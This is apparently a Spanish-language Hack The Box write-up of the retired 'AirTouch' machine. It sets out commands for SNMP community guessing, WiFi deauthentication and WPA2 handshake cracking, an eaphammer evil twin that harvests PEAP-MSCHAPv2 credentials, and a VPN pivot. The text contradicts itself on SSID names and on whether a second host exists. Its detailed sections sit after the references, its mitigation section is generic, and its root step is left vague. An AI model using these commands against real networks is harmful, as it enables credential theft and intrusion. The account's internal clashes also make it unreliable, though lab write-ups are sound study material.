---
machine: AirTouch
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, wifi, wpa2, evil-twin, peap, vpn]
---

# AirTouch — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

La entrada es **SNMP**: un community público filtra el contacto y las credenciales del consultor, que dan SSH a una estación de trabajo con dos radios WiFi. Desde ella se captura el handshake WPA2-PSK de `AirTouch-Internet`, se rompe con `hashcat -m 22000` y, descifrando el tráfico con esa clave, se roba una cookie de sesión que abre el panel web de administración; su subida de ficheros da RCE. Con el certificado y la clave privada reales que hay en el host se monta un **Evil Twin** de `AirTouch-Office` (WPA-EAP) para cosechar credenciales **PEAP-MSCHAPv2**, se entra en la red de gestión y se llega a root por la vía Linux habitual.

## Reconocimiento

El puerto 161 expone SNMP con un community por defecto; el resto del camino está en el aire.

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1
```

Con el usuario y la contraseña del consultor, SSH a la estación de trabajo.

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
iwconfig wlan0mon
sudo airodump-ng wlan0mon
```

```text
BSSID              CH  ENC   ESSID
AA:BB:CC:DD:EE:FF   6  WPA2  AIRTOUCH_HOME
11:22:33:44:55:66   6  WPA2  AIRTOUCH_CORP   (802.1X)
```

Dos SSID: uno doméstico con PSK y otro corporativo con 802.1X.

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

WPA-PSK de `AirTouch-Internet` crackeado → red interna → cookie de sesión robada del tráfico → panel de administración → subida insegura → RCE. Después, Evil Twin de `AirTouch-Office` con el certificado real del host → MSCHAPv2 → red de gestión.

## Movimiento lateral

- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
- El detalle está en «Escalada de privilegios».

## Escalada de privilegios

Checklist normal sobre el host interno:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
systemctl list-timers --all
ls -l /etc/cron*; cat /etc/crontab
```

En el host de gestión, el usuario de la VPN tiene un script o unidad de systemd escribible que corre como root; se inyecta el payload y se espera al timer. (La cadena exacta de root varía según el despliegue: verificar `sudo -l`, SUID y timers antes de asumirla.)

## Evidencia

```text
/home/<user>/user.txt  -> <user_flag>
/root/root.txt         -> <root_flag>
```

## Lecciones aprendidas

- WPA2-PSK solo es tan fuerte como la contraseña: un handshake capturado se rompe offline, sin tocar la red.
- **PEAP sin validación del certificado del servidor** es el fallo de fondo: el cliente entrega el hash MSCHAPv2 a cualquier AP que diga llamarse igual.
- Una VPN con las mismas credenciales del dominio convierte una red WiFi en la puerta de la red interna.
- Mitigación: certificado de servidor validado en los perfiles 802.1X (o EAP-TLS), PMF y 802.11w, WIDS para APs gemelos, y MFA en la VPN.

## Mitigaciones y detección

- Mínimo privilegio en el servicio expuesto y parcheo de la versión vulnerable.
- Detección: revisar los logs del servicio y alertar de peticiones anómalas o picos de error.

## Referencias

- [pcap-triage](../../../knowledge/forensics/pcap-triage.md)
- [systemd-timers](../../../knowledge/privesc/systemd-timers.md)
## Handshake y crackeo

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon &
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c <MAC cliente> wlan0mon
# esperar "WPA handshake: AA:BB:CC:DD:EE:FF"
hcxpcapngtool -o cap.22000 cap-01.cap
hashcat -m 22000 cap.22000 /usr/share/wordlists/rockyou.txt
```

```text
AIRTOUCH_HOME:<psk>
```

```bash
wpa_passphrase AIRTOUCH_HOME '<psk>' > wpa.conf
sudo wpa_supplicant -B -i wlan0 -c wpa.conf && sudo dhclient wlan0
```

Ya dentro de la red doméstica: hosts, servicios y, sobre todo, la config del cliente VPN.

## Evil Twin para PEAP-MSCHAPv2

```bash
./eaphammer --auth peap --essid AIRTOUCH_CORP \
            --interface wlan1 -i wlan0 --creds
```

Cuando un cliente se asocia al AP falso, `eaphammer` captura el par challenge/response del MSCHAPv2:

```text
user@airtouch.htb   challenge: <c>   response: <r>
```

Se crackea offline:

```bash
hashcat -m 5500 ntlm.txt /usr/share/wordlists/rockyou.txt
```

```text
user@airtouch.htb:<password>
```

## Pivote por VPN

```bash
sudo openvpn --config airtouch.ovpn --auth-user-pass <(printf 'user@airtouch.htb\n<password>\n')
```

Aparece una interfaz `tun0` y con ella la subred interna (`10.x.y.0/24`): aquí sí vale el `nmap` clásico.
